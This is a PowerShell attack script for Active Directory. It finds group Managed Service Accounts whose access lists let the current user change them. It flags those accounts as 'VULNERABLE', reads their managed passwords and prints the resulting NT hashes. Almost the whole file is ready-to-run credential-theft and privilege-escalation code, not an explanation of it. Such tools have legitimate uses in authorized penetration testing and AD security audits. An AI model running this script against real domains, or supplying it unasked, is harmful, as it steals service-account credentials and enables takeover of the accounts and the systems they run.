# gMSAAbuse.ps1
# Script to retrieve all gMSA(s) on domain and check for abuse potential against current user

Import-Module ActiveDirectory

$CU = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$CurrentUserName = $CU.Name
Write-Host "[+] Script running as: $CurrentUserName"

try {
    $adUser = Get-ADUser -Identity ($CurrentUserName.Split('\')[1]) -Properties MemberOf
    $userGroups = @()
    foreach ($group in $adUser.MemberOf) {
        try {
            $groupObj = Get-ADObject $group -Properties Name
            $userGroups += $groupObj.Name
        } catch {
            $userGroups += $group.ToString()
        }
    }
    Write-Host "[+] $CurrentUserName is a member of the following groups:"
    $userGroups | ForEach-Object { Write-Host "  - $_" }
} catch {
    Write-Host "[!] Could not retrieve group memberships for current user $_" -ForegroundColor Red
}

Write-Host "`n[+] Starting gMSA enumeration" -ForegroundColor Green

$gmsaAccounts = Get-ADServiceAccount -Filter * -Properties memberOf
$results = @()

foreach ($account in $gmsaAccounts) {
    $memberOf = $account.memberOf
    
    if ($null -eq $memberOf -or $memberOf.Count -eq 0) {
        continue
    }
    
    $groupNames = @()
    foreach ($group in $memberOf) {
        try {
            $obj = Get-ADObject $group -Properties Name
            $groupNames += $obj.Name
        } catch {
            $groupNames += $group.ToString()
        }
    }
    
    $accountInfo = [PSCustomObject]@{
        Name = $account.Name
        SamAccountName = $account.SamAccountName
        DistinguishedName = $account.DistinguishedName
        Enabled = $account.Enabled
        MemberOf = ($groupNames -join ", ")
    }
    
    $results += $accountInfo
}

$results | Format-Table -AutoSize

if ($results.Count -gt 0) {
    Write-Host "[+] Found $($results.Count) gMSA(s) with group memberships" -ForegroundColor Green
} else {
    Write-Host "[!] No gMSA(s) with group memberships found" -ForegroundColor Red
    exit
}

Write-Host "`n[+] Checking for permissions on gMSA(s)..."

$schemaIDGUID = @{}
Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -LDAPFilter '(name=ms-ds-GroupMSAMembership)' -Properties name, schemaIDGUID |
ForEach-Object {$schemaIDGUID.add([System.GUID]$_.schemaIDGUID,$_.name)}

$userIdentities = @($CurrentUserName)
foreach ($group in $userGroups) {
    $userIdentities += $group
    $userIdentities += "$((Get-ADDomain).NetBIOSName)\$group"
}

Write-Host "[+] Checking for permissions that allow modification of gMSA attributes..."
$vulnerableGMSAs = @()

Set-Location ad:
foreach ($gmsa in $results) {
    $hasPermission = $false
    $permissionDetails = @()
    
    $acl = Get-Acl $gmsa.DistinguishedName
    $relevantAces = $acl.Access | Where-Object { 
        (($_.AccessControlType -eq 'Allow') -and 
         ($_.activedirectoryrights -in ('GenericAll') -and 
          $_.inheritancetype -in ('All', 'None'))) -or 
        (($_.activedirectoryrights -like '*WriteProperty*') -and 
         ($_.objecttype -eq '00000000-0000-0000-0000-000000000000'))
    }
    
    foreach ($ace in $relevantAces) {
        $identity = $ace.IdentityReference.ToString()
        if ($userIdentities -contains $identity) {
            $hasPermission = $true
            $permissionDetails += "- $identity has $($ace.ActiveDirectoryRights) rights"
        }
    }
    
    $specificAces = $acl.Access | Where-Object {
        (($_.AccessControlType -eq 'Allow') -and 
         ($_.activedirectoryrights -like '*WriteProperty*') -and 
         ($_.objecttype -in $schemaIDGUID.Keys))
    }
    
    foreach ($ace in $specificAces) {
        $identity = $ace.IdentityReference.ToString()
        if ($userIdentities -contains $identity) {
            $hasPermission = $true
            $permissionDetails += "- $identity has $($ace.ActiveDirectoryRights) rights on ms-ds-GroupMSAMembership attribute"
        }
    }
    
    if ($hasPermission) {
        $vulnerableGMSAs += $gmsa
        Write-Host "`n[!] VULNERABLE: Current user can modify attributes on gMSA: $($gmsa.Name)" -ForegroundColor Green
        foreach ($detail in $permissionDetails) {
            Write-Host "  $detail"
        }
    }
}

Set-Location $env:USERPROFILE

if ($vulnerableGMSAs.Count -gt 0) {
    Write-Host "`n[+] Found $($vulnerableGMSAs.Count) gMSA(s) that the current user can potentially abuse!" -ForegroundColor Green
    
    Write-Host "`n[+] Attempting to retrieve NT hashes for vulnerable gMSA(s)..." -ForegroundColor Green
    
    foreach ($gmsa in $vulnerableGMSAs) {
        Write-Host "`n[+] Processing gMSA: $($gmsa.Name)"
        
        try {
            Write-Host "  [+] Retrieving managed password..."
            $pwd = Get-ADServiceAccount -Identity $gmsa.Name -Properties msds-ManagedPassword
            
            if ($pwd.'msds-ManagedPassword') {
                Write-Host "  [+] Converting managed password to NT hash..."
                $pw = ConvertFrom-ADManagedPasswordBlob $pwd.'msds-ManagedPassword'
                $ntHash = ConvertTo-NTHash $pw.SecureCurrentPassword
                Write-Host "  [+] NT Hash for $($gmsa.Name): $ntHash" -ForegroundColor Green
            } else {
                Write-Host "  [!] Failed to retrieve managed password" -ForegroundColor Red
            }
        } catch {
            Write-Host "  [!] Error retrieving NT hash: $_" -ForegroundColor Red
        }
    }
} else {
    Write-Host "`n[!] No gMSA(s) found that the current user can modify." -ForegroundColor Red
    exit
}